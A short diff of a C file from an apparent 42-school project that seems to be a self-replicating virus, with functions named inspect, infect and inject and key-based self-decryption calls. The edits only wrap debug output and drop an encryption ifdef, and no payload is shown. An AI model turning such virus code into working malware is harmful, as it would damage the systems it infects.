@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/31 19:28:21 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/31 19:28:23 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/03/31 20:56:35 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,11 +14,9 @@
 
 void	inspect(t_data *data, char *path)
 {
-#ifdef ENCRYPT
 //	revert_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
 //	update_two(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
 //	printf("inspect key = %lx\n", data->key.two);
-#endif
 
 #ifdef DEBUG
 	char de[] = "inspect\t \n";
@@ -54,9 +52,11 @@ void	inspect(t_data *data, char *path)
 	}
 	data->context = true;
 
+#ifdef DEBUG
 	_write(1, path, _strlen(path));
-	char de2[] = "\n";
-	_write(1, de2, 1);
+	char c = '\n';
+	_write(1, &c, 1);
+#endif
 
 ERR:
 //	revert_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
